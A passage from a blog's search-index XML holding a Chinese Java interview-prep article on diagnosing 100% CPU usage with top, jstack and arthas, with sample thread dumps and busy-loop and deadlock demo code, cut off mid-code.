<code>SmartLifecype</code>中注册服务的！</p><p>整理10 个小时写完本篇文章，希望大家有所收获。</p>]]></content>
      
      
      <categories>
          
          <category> 面试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> springboot启动原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      
        <title>CPU打满怎么处理</title>
      
      <link href="/2024/06/16/CPU%E6%89%93%E6%BB%A1%E6%80%8E%E4%B9%88%E5%A4%84%E7%90%86/"/>
      <url>/2024/06/16/CPU%E6%89%93%E6%BB%A1%E6%80%8E%E4%B9%88%E5%A4%84%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h2 id="1-cpu占用很高的3大类型，9大场景"><a href="#1-cpu占用很高的3大类型，9大场景" class="headerlink" title="1.cpu占用很高的3大类型，9大场景:"></a>1.cpu占用很高的3大类型，9大场景:</h2><p>CPU 飙升是一个常见的问题。</p><p>在生产环境中，会出现由代码问题导致CPU占用很高，该如何诊断出是哪行java代码导致? 是大家的一项重要基本功，也是大家面试中的家常骗饭。</p><p>如果连CPU 飙升的问题都回答不清楚， 都支支吾吾， 面试就很难通过了</p><p>下面，用20多年的技术内功洪荒之力，给大家梳理一下 cpu占用很高的三大类型问题，9大问题场景。</p><p><img src="/./2024/06/16/CPU%E6%89%93%E6%BB%A1%E6%80%8E%E4%B9%88%E5%A4%84%E7%90%86/1.png"></p><h3 id="第1大类型导致CPU100-的问题：-业务类问题"><a href="#第1大类型导致CPU100-的问题：-业务类问题" class="headerlink" title="第1大类型导致CPU100%的问题： 业务类问题"></a>第1大类型导致CPU100%的问题： 业务类问题</h3><p><img src="/./2024/06/16/CPU%E6%89%93%E6%BB%A1%E6%80%8E%E4%B9%88%E5%A4%84%E7%90%86/2.png"></p><h4 id="1-1-死循环"><a href="#1-1-死循环" class="headerlink" title="1.1 死循环"></a>1.1 死循环</h4><blockquote><p>while(true)条件</p></blockquote><p>导致 CPU 占用率高的最简单但最具破坏性的编程错误之一就是死循环。</p><p>当程序中的循环缺乏正确的退出条件或条件从未满足时，就会出现这种情况，</p><p>死循环无休止地运行，消耗过多的处理器时间，导致CPU100%</p><h4 id="1-2-死锁"><a href="#1-2-死锁" class="headerlink" title="1.2 死锁"></a>1.2 死锁</h4><p>发生死锁后，就会存在忙等待或自旋锁等编程问题，从而导致 繁忙等待问题。</p><p>即进程在不释放 CPU 的情况下反复检查条件是否满足，会导致 CPU 占用率居高不下。</p><p>这种低效率的资源使用会妨碍 CPU 执行其他任务。</p><h4 id="1-3-不必要的代码块"><a href="#1-3-不必要的代码块" class="headerlink" title="1.3 不必要的代码块"></a>1.3 不必要的代码块</h4><p>在不需要的地方使用<code>synchronized</code>块，会导致线程竞争和上下文切换</p><p>解决方案:尽量减少同步块的使用范围</p><h3 id="第2大类型导致CPU100-的问题：并发类问题"><a href="#第2大类型导致CPU100-的问题：并发类问题" class="headerlink" title="第2大类型导致CPU100%的问题：并发类问题"></a>第2大类型导致CPU100%的问题：并发类问题</h3><p><img src="/./2024/06/16/CPU%E6%89%93%E6%BB%A1%E6%80%8E%E4%B9%88%E5%A4%84%E7%90%86/3.png"></p><h4 id="1-4-大量计算密集型的任务"><a href="#1-4-大量计算密集型的任务" class="headerlink" title="1.4 大量计算密集型的任务"></a>1.4 大量计算密集型的任务</h4><p>比如复杂的数学计算，图像处理，视频编码</p><p>计算密集型的任务需要大量的计算能力。在没有足够系统资源的情况下运行这些应用程序，可能会导致 CPU 占用率达到 100%，因为它们试图执行高要求的任务。</p><p>解决方案:优化算法，使用更高效的库，或者利用并行计算来分摊</p><h4 id="1-5-大量并发线程"><a href="#1-5-大量并发线程" class="headerlink" title="1.5 大量并发线程"></a>1.5 大量并发线程</h4><p>多个线程同时运行会导致对 CPU 资源的竞争，尤其是当其中许多线程都是资源密集型进程时。</p><p>这会导致所有线程获得的 CPU 时间减少，当每个线程都试图完成自己的任务时，CPU 时间可能会被耗尽。</p><h4 id="1-6-大量的上下文切换"><a href="#1-6-大量的上下文切换" class="headerlink" title="1.6 大量的上下文切换"></a>1.6 大量的上下文切换</h4><p>创建过多的线程，导致频繁的上下文切换</p><p>解决方案:使用线程池来管理线程的数量</p><h3 id="第3大类导致CPU100-的问题：内存类问题"><a href="#第3大类导致CPU100-的问题：内存类问题" class="headerlink" title="第3大类导致CPU100%的问题：内存类问题"></a>第3大类导致CPU100%的问题：内存类问题</h3><p><img src="/./2024/06/16/CPU%E6%89%93%E6%BB%A1%E6%80%8E%E4%B9%88%E5%A4%84%E7%90%86/4.png"></p><h4 id="1-7-内存不足"><a href="#1-7-内存不足" class="headerlink" title="1.7 内存不足"></a>1.7 内存不足</h4><p>当系统内存不足时，就会将磁盘存储作为虚拟内存使用，而虚拟内存的运行速度要慢得多。</p><p>这种<strong>过度的分页和交换</strong>会导致 CPU 占用率居高不下，因为处理器需要花费更多时间来管理内存访问，而不是高效地执行进程。</p><h4 id="1-8-频繁GC"><a href="#1-8-频繁GC" class="headerlink" title="1.8 频繁GC"></a>1.8 频繁GC</h4><p>创建大量的短生命周期的对象，频繁触发GC</p><p>解决方案: 优化代码， 减少对象的创建 ，或者调整JVM的参数来优化</p><h4 id="1-9-内存泄漏"><a href="#1-9-内存泄漏" class="headerlink" title="1.9 内存泄漏"></a>1.9 内存泄漏</h4><p>程序持续分配内存但不释放，会导致频繁的GC</p><p>解决方案:使用内存分析工具VisualVM进行检测和修复</p><h2 id="2-CPU100-定位的两大神器"><a href="#2-CPU100-定位的两大神器" class="headerlink" title="2.CPU100%定位的两大神器:"></a>2.CPU100%定位的两大神器:</h2><p>想要定位到具体是哪一行的代码导致， 一般都会使用下面的两大神器</p><ul><li><p>通常使用的jvm自带的工具jstack，</p></li><li><p>还有一种就是开源神器arthas，</p></li></ul><p>一般而言，arthas还有其它的功能，所以选择它多一点.</p><p><img src="/./2024/06/16/CPU%E6%89%93%E6%BB%A1%E6%80%8E%E4%B9%88%E5%A4%84%E7%90%86/5.png"><br>在后面的讲解中，</p><p>会首先讲解jstack， 使用jstack来解决实际遇到的问题，</p><p>然后在使用第二大神器 arthas来解决相同的问题，</p><p>大家可以在这两个工具使用过程中选择自己比较顺手的， 这里推荐 arthas， 关于arthas的细致学习，请参考的《arthas 学习圣经》 PDF。</p><blockquote><p>此面试题的配套视频，请参见《Java面试宝典核心面试题》第二季。</p></blockquote><h2 id="3-CPU-飙升100-的解决思路与方法论"><a href="#3-CPU-飙升100-的解决思路与方法论" class="headerlink" title="3 CPU 飙升100%的解决思路与方法论"></a>3 CPU 飙升100%的解决思路与方法论</h2><h2 id="4-使用jstack-解决CPU-100-问题实操"><a href="#4-使用jstack-解决CPU-100-问题实操" class="headerlink" title="4 使用jstack 解决CPU 100%问题实操"></a><img src="/./2024/06/16/CPU%E6%89%93%E6%BB%A1%E6%80%8E%E4%B9%88%E5%A4%84%E7%90%86/6.png"><br>4 使用jstack 解决CPU 100%问题实操</h2><p>使用jstack 解决CPU 100%问题，在方法论上要用到两个命令，</p><ul><li><p>top 命令查看TOP N线程，</p></li><li><p>jstack命令查看堆栈信息</p></li></ul><p><img src="/./2024/06/16/CPU%E6%89%93%E6%BB%A1%E6%80%8E%E4%B9%88%E5%A4%84%E7%90%86/7.png"></p><blockquote><p>此面试题的配套视频，请参见《Java面试宝典核心面试题》第二季。</p></blockquote><h3 id="4-1-jstack命令讲解"><a href="#4-1-jstack命令讲解" class="headerlink" title="4.1.jstack命令讲解"></a>4.1.jstack命令讲解</h3><p>命令jstack是java堆栈的跟踪工具，可以打印出程序中所有线程的堆栈信息，包括线程状态，调用栈信息，锁信息等。</p><p>jstack可以诊断线程死锁、内存泄漏等问题</p><p>命令格式: jstack [options] pid</p><blockquote><p>常用例子: jstack -l pid，查看线程的堆栈信息</p></blockquote><p>堆栈信息解读:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">yupengdembp:TestYupeng yupeng$ jstack -l 43953  </span><br><span class="line">2024\-06\-08 10:14:45  </span><br><span class="line">Full thread dump Java HotSpot(TM) 64-Bit Server VM (25.191\-b12 mixed mode):  </span><br><span class="line">  </span><br><span class="line">&quot;Attach Listener&quot; #10 daemon prio=9 os\_prio=31 tid=0x00007fb54485a000 nid=0x3503 waiting on condition \[0x0000000000000000\]  </span><br><span class="line">   java.lang.Thread.State: RUNNABLE  </span><br><span class="line">  </span><br><span class="line">   Locked ownable synchronizers:  </span><br><span class="line">        - None  </span><br><span class="line">  </span><br><span class="line">&quot;Service Thread&quot; #9 daemon prio=9 os\_prio=31 tid=0x00007fb5430b4000 nid=0x3203 runnable \[0x0000000000000000\]  </span><br><span class="line">   java.lang.Thread.State: RUNNABLE  </span><br><span class="line">  </span><br><span class="line">   Locked ownable synchronizers:  </span><br><span class="line">        - None  </span><br><span class="line">  </span><br><span class="line">&quot;C1 CompilerThread2&quot; #8 daemon prio=9 os\_prio=31 tid=0x00007fb54407e800 nid=0x3103 runnable \[0x0000000000000000\]  </span><br><span class="line">   java.lang.Thread.State: RUNNABLE  </span><br><span class="line">  </span><br><span class="line">   Locked ownable synchronizers:  </span><br><span class="line">        - None  </span><br><span class="line">  </span><br><span class="line">&quot;C2 CompilerThread1&quot; #7 daemon prio=9 os\_prio=31 tid=0x00007fb54400f800 nid=0x4203 runnable \[0x0000000000000000\]  </span><br><span class="line">   java.lang.Thread.State: RUNNABLE  </span><br><span class="line">  </span><br><span class="line">   Locked ownable synchronizers:  </span><br><span class="line">        - None  </span><br><span class="line">  </span><br><span class="line">&quot;C2 CompilerThread0&quot; #6 daemon prio=9 os\_prio=31 tid=0x00007fb54285a000 nid=0x4403 waiting on condition \[0x0000000000000000\]  </span><br><span class="line">   java.lang.Thread.State: RUNNABLE  </span><br><span class="line">  </span><br><span class="line">   Locked ownable synchronizers:  </span><br><span class="line">        - None  </span><br><span class="line">  </span><br><span class="line">&quot;Monitor Ctrl-Break&quot; #5 daemon prio=5 os\_prio=31 tid=0x00007fb5430ab000 nid=0x4503 runnable \[0x0000700002427000\]  </span><br><span class="line">   java.lang.Thread.State: RUNNABLE  </span><br><span class="line">        at java.net.SocketInputStream.socketRead0(Native Method)  </span><br><span class="line">        at java.net.SocketInputStream.socketRead(SocketInputStream.java:116)  </span><br><span class="line">        at java.net.SocketInputStream.read(SocketInputStream.java:171)  </span><br><span class="line">        at java.net.SocketInputStream.read(SocketInputStream.java:141)  </span><br><span class="line">        at sun.nio.cs.StreamDecoder.readBytes(StreamDecoder.java:284)  </span><br><span class="line">        at sun.nio.cs.StreamDecoder.implRead(StreamDecoder.java:326)  </span><br><span class="line">        at sun.nio.cs.StreamDecoder.read(StreamDecoder.java:178)  </span><br><span class="line">        - locked &lt;0x000000079570b9e0\&gt; (a java.io.InputStreamReader)  </span><br><span class="line">        at java.io.InputStreamReader.read(InputStreamReader.java:184)  </span><br><span class="line">        at java.io.BufferedReader.fill(BufferedReader.java:161)  </span><br><span class="line">        at java.io.BufferedReader.readLine(BufferedReader.java:324)  </span><br><span class="line">        - locked &lt;0x000000079570b9e0\&gt; (a java.io.InputStreamReader)  </span><br><span class="line">        at java.io.BufferedReader.readLine(BufferedReader.java:389)  </span><br><span class="line">        at com.intellij.rt.execution.application.AppMainV2$1.run(AppMainV2.java:47)  </span><br><span class="line">  </span><br><span class="line">   Locked ownable synchronizers:  </span><br><span class="line">        - None  </span><br><span class="line">  </span><br><span class="line">&quot;Signal Dispatcher&quot; #4 daemon prio=9 os\_prio=31 tid=0x00007fb544026000 nid=0x4603 runnable \[0x0000000000000000\]  </span><br><span class="line">   java.lang.Thread.State: RUNNABLE  </span><br><span class="line">  </span><br><span class="line">   Locked ownable synchronizers:  </span><br><span class="line">        - None  </span><br><span class="line">  </span><br><span class="line">&quot;Finalizer&quot; #3 daemon prio=8 os\_prio=31 tid=0x00007fb544817000 nid=0x5103 in Object.wait() \[0x0000700002098000\]  </span><br><span class="line">   java.lang.Thread.State: WAITING (on object monitor)  </span><br><span class="line">        at java.lang.Object.wait(Native Method)  </span><br><span class="line">        - waiting on &lt;0x0000000795588ed0\&gt; (a java.lang.ref.ReferenceQueue$Lock)  </span><br><span class="line">        at java.lang.ref.ReferenceQueue.remove(ReferenceQueue.java:144)  </span><br><span class="line">        - locked &lt;0x0000000795588ed0\&gt; (a java.lang.ref.ReferenceQueue$Lock)  </span><br><span class="line">        at java.lang.ref.ReferenceQueue.remove(ReferenceQueue.java:165)  </span><br><span class="line">        at java.lang.ref.Finalizer$FinalizerThread.run(Finalizer.java:216)  </span><br><span class="line">  </span><br><span class="line">   Locked ownable synchronizers:  </span><br><span class="line">        - None  </span><br><span class="line">  </span><br><span class="line">&quot;Reference Handler&quot; #2 daemon prio=10 os\_prio=31 tid=0x00007fb54303f800 nid=0x2c03 in Object.wait() \[0x0000700001f95000\]  </span><br><span class="line">   java.lang.Thread.State: WAITING (on object monitor)  </span><br><span class="line">        at java.lang.Object.wait(Native Method)  </span><br><span class="line">        - waiting on &lt;0x0000000795586bf8\&gt; (a java.lang.ref.Reference$Lock)  </span><br><span class="line">        at java.lang.Object.wait(Object.java:502)  </span><br><span class="line">        at java.lang.ref.Reference.tryHandlePending(Reference.java:191)  </span><br><span class="line">        - locked &lt;0x0000000795586bf8\&gt; (a java.lang.ref.Reference$Lock)  </span><br><span class="line">        at java.lang.ref.Reference$ReferenceHandler.run(Reference.java:153)  </span><br><span class="line">  </span><br><span class="line">   Locked ownable synchronizers:  </span><br><span class="line">        - None  </span><br><span class="line">  </span><br><span class="line">&quot;main&quot; #1 prio=5 os\_prio=31 tid=0x00007fb54280e000 nid=0xe03 waiting on condition \[0x0000700001983000\]  </span><br><span class="line">   java.lang.Thread.State: TIMED\_WAITING (sleeping)  </span><br><span class="line">        at java.lang.Thread.sleep(Native Method)  </span><br><span class="line">        at com.jvm.JVMtest.main(JVMtest.java:6)  </span><br><span class="line">  </span><br><span class="line">   Locked ownable synchronizers:  </span><br><span class="line">        - None  </span><br><span class="line">  </span><br><span class="line">&quot;VM Thread&quot; os\_prio=31 tid=0x00007fb544816800 nid=0x5303 runnable   </span><br><span class="line">  </span><br><span class="line">&quot;GC task thread#0 (ParallelGC)&quot; os\_prio=31 tid=0x00007fb544009800 nid=0x2507 runnable   </span><br><span class="line">  </span><br><span class="line">&quot;GC task thread#1 (ParallelGC)&quot; os\_prio=31 tid=0x00007fb54300f800 nid=0x2403 runnable   </span><br><span class="line">  </span><br><span class="line">&quot;GC task thread#2 (ParallelGC)&quot; os\_prio=31 tid=0x00007fb543010000 nid=0x2303 runnable   </span><br><span class="line">  </span><br><span class="line">&quot;GC task thread#3 (ParallelGC)&quot; os\_prio=31 tid=0x00007fb543010800 nid=0x2a03 runnable   </span><br><span class="line">  </span><br><span class="line">&quot;VM Periodic Task Thread&quot; os\_prio=31 tid=0x00007fb5430b4800 nid=0x3f03 waiting on condition   </span><br><span class="line">  </span><br><span class="line">JNI global references: 15  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>你会发现上面的信息其实是一段一段的，摘取其中的一段为大家说明:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">&quot;main&quot; #1 prio=5 os\_prio=31 tid=0x00007fb54280e000 nid=0xe03 waiting on condition \[0x0000700001983000\]  </span><br><span class="line">   java.lang.Thread.State: TIMED\_WAITING (sleeping)  </span><br><span class="line">        at java.lang.Thread.sleep(Native Method)  </span><br><span class="line">        at com.jvm.JVMtest.main(JVMtest.java:6)  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>main</code>:线程名称</p><p><code>#1</code>:当前线程ID，从main开始，jvm会根据线程创建的顺序为其线程编号</p><p><code>prio</code>:优先级的顺序，一般默认是5</p><p><code>os_prio</code>:线程对应系统的优先级</p><p><code>tid</code>:java内的线程id</p><p><code>nid</code>:操作系统级别的线程id，是一个十六进制</p><p>关于线程的信息:</p><p><code>NEW</code>:线程新建，还没开始运行</p><p><code>RUNNABLE</code>:正在java虚拟机中运行的线程</p><p><code>BLOCKED</code> :被阻塞，正在等待监视器锁的线程</p><p><code>WAITING</code> :无限期等待另一个线程执行特定操作的线程</p><p><code>TIMED_WAITING</code>:等待另一个线程执行操作达到指定等待时间的线程</p><p><code>TERMINATED</code>:已经退出的线程</p><p>我们这里关注的最多的就是<code>nid</code></p><h3 id="4-2-使用jstack解决CPU占用很高的问题并定位具体行数"><a href="#4-2-使用jstack解决CPU占用很高的问题并定位具体行数" class="headerlink" title="4.2.使用jstack解决CPU占用很高的问题并定位具体行数"></a>4.2.使用jstack解决CPU占用很高的问题并定位具体行数</h3><p>先来看一段代码:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">package com.jvm;  </span><br><span class="line">  </span><br><span class="line">import java.util.concurrent.ExecutorService;  </span><br><span class="line">import java.util.concurrent.Executors;  </span><br><span class="line">  </span><br><span class="line">public class JVMCPU &#123;  </span><br><span class="line">    private static ExecutorService service = Executors.newFixedThreadPool(5);  </span><br><span class="line">    private static Object lock = new Object();  </span><br><span class="line">    public static class yupengTask implements Runnable&#123;  </span><br><span class="line">  </span><br><span class="line">        @Override  </span><br><span class="line">        public void run() &#123;  </span><br><span class="line">            synchronized (lock)&#123;  </span><br><span class="line">                long sum = 0L;  </span><br><span class="line">                while(true)&#123;  </span><br><span class="line">                    sum +=1;  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    public static void main(String\[\] args) &#123;  </span><br><span class="line">  </span><br><span class="line">        yupengTask yupengTask = new yupengTask();  </span><br><span class="line">        service.execute(yupengTask);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>将这段代码上传到linux服务器，并且使用<code>nohup java JVMCPU &amp;</code>运行</p><p><img src="/./2024/06/16/CPU%E6%89%93%E6%BB%A1%E6%80%8E%E4%B9%88%E5%A4%84%E7%90%86/8.png"><br>使用<code>top</code>命令可以看到cpu被打满了</p><p><img src="/./2024/06/16/CPU%E6%89%93%E6%BB%A1%E6%80%8E%E4%B9%88%E5%A4%84%E7%90%86/9.png"><br>知道了进程的PID，如何找到进程下是哪个线程呢?可以使用命令<code>top -Hp 26964</code>，如下所示</p><p><img src="/./2024/06/16/CPU%E6%89%93%E6%BB%A1%E6%80%8E%E4%B9%88%E5%A4%84%E7%90%86/10.png"><br>从上面的图可以看到，cpu占用最多的线程是26976这个线程id，接下来就是使用<code>jstack</code>命令来查看程序的所有堆栈信息，但是，这里需要有一个注意的点，26876这个是一个十进制</p><p>的，使用jstack看到的nid是十六进制，所以我们需要转换，可以使用<code>printf &quot;%x\n&quot;</code>这个命令</p><p><img src="/./2024/06/16/CPU%E6%89%93%E6%BB%A1%E6%80%8E%E4%B9%88%E5%A4%84%E7%90%86/11.png"><br>接下来使用<code>jstack -l 26964</code>打印堆栈信息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">2024\-06\-08 12:17:36  </span><br><span class="line">Full thread dump Java HotSpot(TM) 64-Bit Server VM (25.281\-b09 mixed mode):  </span><br><span class="line">  </span><br><span class="line">&quot;Attach Listener&quot; #10 daemon prio=9 os\_prio=0 tid=0x00007f006c001000 nid=0xc7f waiting on condition \[0x0000000000000000\]  </span><br><span class="line">   java.lang.Thread.State: RUNNABLE  </span><br><span class="line">  </span><br><span class="line">   Locked ownable synchronizers:  </span><br><span class="line">- None  </span><br><span class="line">  </span><br><span class="line">&quot;DestroyJavaVM&quot; #9 prio=5 os\_prio=0 tid=0x00007f00a0009800 nid=0x6955 waiting on condition \[0x0000000000000000\]  </span><br><span class="line">   java.lang.Thread.State: RUNNABLE  </span><br><span class="line">  </span><br><span class="line">   Locked ownable synchronizers:  </span><br><span class="line">- None  </span><br><span class="line">  </span><br><span class="line">&quot;pool-1-thread-1&quot; #8 prio=5 os\_prio=0 tid=0x00007f00a00f0000 nid=0x6960 runnable \[0x00007f008b0ef000\]  </span><br><span class="line">   java.lang.Thread.State: RUNNABLE  </span><br><span class="line">at JVMCPU$yupengTask.run(JVMCPU.java:14)  </span><br><span class="line">- locked &lt;0x00000000f59dfcf0\&gt; (a java.lang.Object)  </span><br><span class="line">at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)  </span><br><span class="line">at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)  </span><br><span class="line">at java.lang.Thread.run(Thread.java:748)  </span><br><span class="line">  </span><br><span class="line">   Locked ownable synchronizers:  </span><br><span class="line">- &lt;0x00000000f59e0ed0\&gt; (a java.util.concurrent.ThreadPoolExecutor$Worker)  </span><br><span class="line">  </span><br><span class="line">&quot;Service Thread&quot; #7 daemon prio=9 os\_prio=0 tid=0x00007f00a00d4800 nid=0x695e runnable \[0x0000000000000000\]  </span><br><span class="line">   java.lang.Thread.State: RUNNABLE  </span><br><span class="line">  </span><br><span class="line">   Locked ownable synchronizers:  </span><br><span class="line">- None  </span><br><span class="line">  </span><br><span class="line">&quot;C1 CompilerThread1&quot; #6 daemon prio=9 os\_prio=0 tid=0x00007f00a00b9800 nid=0x695d waiting on condition \[0x0000000000000000\]  </span><br><span class="line">   java.lang.Thread.State: RUNNABLE  </span><br><span class="line">  </span><br><span class="line">   Locked ownable synchronizers:  </span><br><span class="line">- None  </span><br><span class="line">  </span><br><span class="line">&quot;C2 CompilerThread0&quot; #5 daemon prio=9 os\_prio=0 tid=0x00007f00a00b6800 nid=0x695c waiting on condition \[0x0000000000000000\]  </span><br><span class="line">   java.lang.Thread.State: RUNNABLE  </span><br><span class="line">  </span><br><span class="line">   Locked ownable synchronizers:  </span><br><span class="line">- None  </span><br><span class="line">  </span><br><span class="line">&quot;Signal Dispatcher&quot; #4 daemon prio=9 os\_prio=0 tid=0x00007f00a00b5000 nid=0x695b runnable \[0x0000000000000000\]  </span><br><span class="line">   java.lang.Thread.State: RUNNABLE  </span><br><span class="line">  </span><br><span class="line">   Locked ownable synchronizers:  </span><br><span class="line">- None  </span><br><span class="line">  </span><br><span class="line">&quot;Finalizer&quot; #3 daemon prio=8 os\_prio=0 tid=0x00007f00a0082000 nid=0x695a in Object.wait() \[0x00007f008b6f5000\]  </span><br><span class="line">   java.lang.Thread.State: WAITING (on object monitor)  </span><br><span class="line">at java.lang.Object.wait(Native Method)  </span><br><span class="line">- waiting on &lt;0x00000000f5988ee0\&gt; (a java.lang.ref.ReferenceQueue$Lock)  </span><br><span class="line">at java.lang.ref.ReferenceQueue.remove(ReferenceQueue.java:144)  </span><br><span class="line">- locked &lt;0x00000000f5988ee0\&gt; (a java.lang.ref.ReferenceQueue$Lock)  </span><br><span class="line">at java.lang.ref.ReferenceQueue.remove(ReferenceQueue.java:165)  </span><br><span class="line">at java.lang.ref.Finalizer$FinalizerThread.run(Finalizer.java:216)  </span><br><span class="line">  </span><br><span class="line">   Locked ownable synchronizers:  </span><br><span class="line">- None  </span><br><span class="line">  </span><br><span class="line">&quot;Reference Handler&quot; #2 daemon prio=10 os\_prio=0 tid=0x00007f00a007d800 nid=0x6959 in Object.wait() \[0x00007f008b7f6000\]  </span><br><span class="line">   java.lang.Thread.State: WAITING (on object monitor)  </span><br><span class="line">at java.lang.Object.wait(Native Method)  </span><br><span class="line">- waiting on &lt;0x00000000f5986c00\&gt; (a java.lang.ref.Reference$Lock)  </span><br><span class="line">at java.lang.Object.wait(Object.java:502)  </span><br><span class="line">at java.lang.ref.Reference.tryHandlePending(Reference.java:191)  </span><br><span class="line">- locked &lt;0x00000000f5986c00\&gt; (a java.lang.ref.Reference$Lock)  </span><br><span class="line">at java.lang.ref.Reference$ReferenceHandler.run(Reference.java:153)  </span><br><span class="line">  </span><br><span class="line">   Locked ownable synchronizers:  </span><br><span class="line">- None  </span><br><span class="line">  </span><br><span class="line">&quot;VM Thread&quot; os\_prio=0 tid=0x00007f00a0074000 nid=0x6958 runnable   </span><br><span class="line">  </span><br><span class="line">&quot;GC task thread#0 (ParallelGC)&quot; os\_prio=0 tid=0x00007f00a001e800 nid=0x6956 runnable   </span><br><span class="line">  </span><br><span class="line">&quot;GC task thread#1 (ParallelGC)&quot; os\_prio=0 tid=0x00007f00a0020800 nid=0x6957 runnable   </span><br><span class="line">  </span><br><span class="line">&quot;VM Periodic Task Thread&quot; os\_prio=0 tid=0x00007f00a00d7800 nid=0x695f waiting on condition   </span><br><span class="line">  </span><br><span class="line">JNI global references: 5  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>从上面的信息中，可以看到转换的结果和nid是一致的，</p><p>从下面的信息中就可以看到问题其实是出现在<code>JVMCPU.java</code>的14行左右，这里给出的是14行，但是实际情况是14行的附近</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">&quot;pool-1-thread-1&quot; #8 prio=5 os\_prio=0 tid=0x00007f00a00f0000 nid=0x6960 runnable \[0x00007f008b0ef000\]  </span><br><span class="line">   java.lang.Thread.State: RUNNABLE  </span><br><span class="line">at JVMCPU$yupengTask.run(JVMCPU.java:14)  </span><br><span class="line">- locked &lt;0x00000000f59dfcf0\&gt; (a java.lang.Object)  </span><br><span class="line">at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)  </span><br><span class="line">at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)  </span><br><span class="line">at java.lang.Thread.run(Thread.java:748)  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>结合代码来看一下就很容易问题</p><p><img src="/./2024/06/16/CPU%E6%89%93%E6%BB%A1%E6%80%8E%E4%B9%88%E5%A4%84%E7%90%86/12.png"></p><blockquote><p>此面试题的配套视频，请参见《Java面试宝典核心面试题》第二季。</p></blockquote><h2 id="5-使用arthas解决CPU占用很高的问题，定位具体代码行"><a href="#5-使用arthas解决CPU占用很高的问题，定位具体代码行" class="headerlink" title="5.使用arthas解决CPU占用很高的问题，定位具体代码行"></a>5.使用arthas解决CPU占用很高的问题，定位具体代码行</h2><p>使用arthas解决CPU 100%问题，在方法论上要用到两个命令，</p><ul><li><p>dashboard 命令查看TOP N线程，</p></li><li><p>thread 命令查看堆栈信息</p></li></ul><p><img src="/./2024/06/16/CPU%E6%89%93%E6%BB%A1%E6%80%8E%E4%B9%88%E5%A4%84%E7%90%86/13.png"><br>先来运行<code>arthas</code></p><p><img src="/./2024/06/16/CPU%E6%89%93%E6%BB%A1%E6%80%8E%E4%B9%88%E5%A4%84%E7%90%86/14.png"><br>输入1显示如下</p><p><img src="/./2024/06/16/CPU%E6%89%93%E6%BB%A1%E6%80%8E%E4%B9%88%E5%A4%84%E7%90%86/15.png"><br>输入<code>dashboard</code>命令可以看到是哪个线程占用cpu最高</p><p><img src="/./2024/06/16/CPU%E6%89%93%E6%BB%A1%E6%80%8E%E4%B9%88%E5%A4%84%E7%90%86/16.png"><br>接下来输入<code>thread -n 3</code>，表示最忙的前3个线程并打印信息</p><p><img src="/./2024/06/16/CPU%E6%89%93%E6%BB%A1%E6%80%8E%E4%B9%88%E5%A4%84%E7%90%86/17.png"><br>从上面的图中可以看到arthas和jstack展示的信息差不多，都定位到了<code>JVMCPU.java</code>的14行程序</p><h2 id="6-死锁导致CPU占用很高的问题分析"><a href="#6-死锁导致CPU占用很高的问题分析" class="headerlink" title="6.死锁导致CPU占用很高的问题分析"></a>6.死锁导致CPU占用很高的问题分析</h2><p>先来看一段代码:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">public class DeadlockDemo &#123;  </span><br><span class="line">  </span><br><span class="line">    // 创建两个锁对象  </span><br><span class="line">    private static final Object lock1 = new Object();  </span><br><span class="line">    private static final Object lock2 = new Object();  </span><br><span class="line">  </span><br><span class="line">    public static void main(String\[\] args) &#123;  </span><br><span class="line">  </span><br><span class="line">        // 线程1尝试获取lock1，然后获取lock2  </span><br><span class="line">        Thread thread1 = new Thread(() -&gt; &#123;  </span><br><span class="line">            synchronized (lock1) &#123;  </span><br><span class="line">                System.out.println(&quot;Thread 1: Holding lock 1...&quot;);  </span><br><span class="line">  </span><br><span class="line">                try &#123; Thread.sleep(100); &#125;   </span><br><span class="line">                catch (InterruptedException e) &#123;&#125;  </span><br><span class="line">  </span><br><span class="line">                System.out.println(&quot;Thread 1: Waiting for lock 2...&quot;);  </span><br><span class="line">  </span><br><span class="line">                synchronized (lock2) &#123;  </span><br><span class="line">                    System.out.println(&quot;Thread 1: Holding lock 1 &amp; 2...&quot;);  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;);  </span><br><span class="line">  </span><br><span class="line">        // 线程2尝试获取lock2，然后获取lock1  </span><br><span class="line">        Thread thread2 = new Thread(() -&gt; &#123;  </span><br><span class="line">            synchronized (lock2) &#123;  </span><br><span class="line">                System.out.println(&quot;Thread 2: Holding lock 2...&quot;);  </span><br><span class="line">  </span><br><span class="line">                try &#123; Thread.sleep(100); &#125;   </span><br><span class="line">                catch (InterruptedException e) &#123;&#125;  </span><br><span class="line">  </span><br><span class="line">                System.out.println(&quot;Thread 2: Waiting for lock 1...&quot;);  </span><br><span class="line">  </span><br><span class="line">                synchronized (lock1) &#123;  </span><br><span class="line">               